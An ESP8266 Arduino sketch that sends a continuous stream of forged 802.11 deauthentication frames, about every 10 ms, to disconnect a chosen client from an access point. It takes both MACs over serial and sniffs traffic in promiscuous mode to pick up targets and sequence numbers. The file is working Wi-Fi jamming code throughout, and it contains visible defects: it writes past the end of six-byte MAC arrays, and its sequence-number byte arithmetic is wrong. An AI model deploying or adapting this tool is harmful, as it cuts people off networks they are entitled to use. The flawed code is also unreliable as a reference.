#include <ESP8266WiFi.h>
#include <user_config.h>
#define CHANNEL_HOP_INTERVAL 10

extern "C" {
  #include "user_interface.h"
}

#define user_procTaskPrio        0
#define user_procTaskQueueLen    1
os_event_t    user_procTaskQueue[user_procTaskQueueLen];
os_timer_t deauth_timer;

// Channel to perform deauth
uint8_t channel = 1;

// Access point MAC to deauth
uint8_t ap[6] = {0x00,0x01,0x02,0x03,0x04,0x05};

// Client MAC to deauth
uint8_t clientMAC[6] = {0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B};

// Sequence number of a packet from AP to client
uint16_t seq_n = 0;

// Packet buffer
uint8_t packet_buffer[64];

struct RxControl {
    signed rssi:8;
    unsigned rate:4;
    unsigned is_group:1;
    unsigned:1;
    unsigned sig_mode:2;
    unsigned legacy_length:12;
    unsigned damatch0:1;
    unsigned damatch1:1;
    unsigned bssidmatch0:1;
    unsigned bssidmatch1:1;
    unsigned MCS:7;
    unsigned CWB:1;
    unsigned HT_length:16;
    unsigned Smoothing:1;
    unsigned Not_Sounding:1;
    unsigned:1;
    unsigned Aggregation:1;
    unsigned STBC:2;
    unsigned FEC_CODING:1;
    unsigned SGI:1;
    unsigned rxend_state:8;
    unsigned ampdu_cnt:8;
    unsigned channel:4;
    unsigned:12;
};

struct LenSeq {
    uint16_t length;
    uint16_t seq;
    uint8_t  address3[6];
};

struct sniffer_buf {
    struct RxControl rx_ctrl;
    uint8_t buf[36];
    uint16_t cnt;
    struct LenSeq lenseq[1];
};

struct sniffer_buf2{
    struct RxControl rx_ctrl;
    uint8_t buf[112];
    uint16_t cnt;
    uint16_t len;
};

// Beacon Packet buffer
uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 
                /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
                /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
                /*22*/  0xc0, 0x6c, 
                /*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
                /*32*/  0x64, 0x00, 
                /*34*/  0x01, 0x04, 
                /* SSID */
                /*36*/  0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
                        0x01, 0x08, 0x82, 0x84,
                        0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 
                /*56*/  0x04};      
                                 
/* Creates a deauth packet.
 * 
 * buf - reference to the data array to write packet to;
 * clientMAC - MAC address of the client;
 * ap - MAC address of the acces point;
 * seq - sequence number of 802.11 packet;
 * 
 * Returns: size of the packet
 */
uint16_t deauth_packet(uint8_t *buf, uint8_t *clientMAC, uint8_t *ap, uint16_t seq)
{
    int i=0;
    
    // Type: deauth
    buf[0] = 0xC0;
    buf[1] = 0x00;
    // Duration 0 msec, will be re-written by ESP
    buf[2] = 0x00;
    buf[3] = 0x00;
    // Destination
    for (i=0; i<6; i++) buf[i+4] = clientMAC[i];
    // Sender
    for (i=0; i<6; i++) buf[i+10] = ap[i];
    for (i=0; i<6; i++) buf[i+16] = ap[i];
    // Seq_n
    buf[22] = seq % 0xFF;
    buf[23] = seq / 0xFF;
    // Deauth reason
    buf[24] = 1;
    buf[25] = 0;
    return 26;
}     

void promisc_cb(uint8_t *buf, uint16_t len)
{
    if (len == 12){
        struct RxControl *sniffer = (struct RxControl*) buf;
    } else if (len == 128) {
        struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    } else {
        struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
        int i=0;
        // Check MACs
        for (i=0; i<6; i++) {
          clientMAC[i] = sniffer->buf[i+4];
        }
        for (i=0; i<6; i++) {
         ap[i] = sniffer->buf[i+10];
        }
        // Update sequence number
        seq_n = sniffer->buf[23] * 0xFF + sniffer->buf[22];
    }
}

/* Sends deauth packets. */
void deauth()
{
    Serial.println("\nSending deauth...\n");
    // Sequence number is increased by 16, see 802.11
    uint16_t size = deauth_packet(packet_buffer, clientMAC, ap, seq_n+0x10);
    wifi_send_pkt_freedom(packet_buffer, size, 0);
    Serial.println("\nSent deauth...\n");
}

void getMac() {
  Serial.println("\nAP MAC:");
  while(Serial.available() < 1);
  for(uint8_t i=0; i<5; i++)
    ap[i]=strtol(Serial.readStringUntil(':').c_str(),NULL,16);
  ap[6]=strtol(Serial.readStringUntil('\n').c_str(),NULL,16);
  Serial.println("\n\nClient MAC:");
  while(Serial.available() < 1);
  for(uint8_t i=0; i<5; i++)
    clientMAC[i]=strtol(Serial.readStringUntil(':').c_str(),NULL,16);
  clientMAC[6]=strtol(Serial.readStringUntil('\n').c_str(),NULL,16);
}

void setup() {
  Serial.begin(115200); 
  while (!Serial);
  Serial.println("\n\nSetting up...");
  Serial.setTimeout(15000);
  delay(500);
  getMac();

  // Promiscuous works only with station mode
  wifi_set_opmode(STATION_MODE);  

  os_timer_disarm(&deauth_timer);
  os_timer_setfn(&deauth_timer, (os_timer_func_t *) deauth, NULL);
  os_timer_arm(&deauth_timer, CHANNEL_HOP_INTERVAL, 1);
  
  // Set up promiscuous callback
  wifi_set_channel(1);
  wifi_promiscuous_enable(0);
  
  delay(500);
  
  wifi_set_promiscuous_rx_cb(promisc_cb);
  wifi_promiscuous_enable(1);  
}

void loop() {
  yield();
}
